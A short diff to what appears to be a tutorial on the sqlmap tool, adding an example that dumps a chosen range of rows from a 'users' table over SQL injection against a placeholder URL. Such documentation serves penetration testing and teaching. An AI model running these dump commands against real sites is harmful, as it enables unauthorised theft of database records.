@@ -91,3 +91,7 @@ We can also specify the only column to dump with -C option:
 ```
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
 ```
+We can only enumerate a specific range of rows by specifying --start and --stop:
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+```
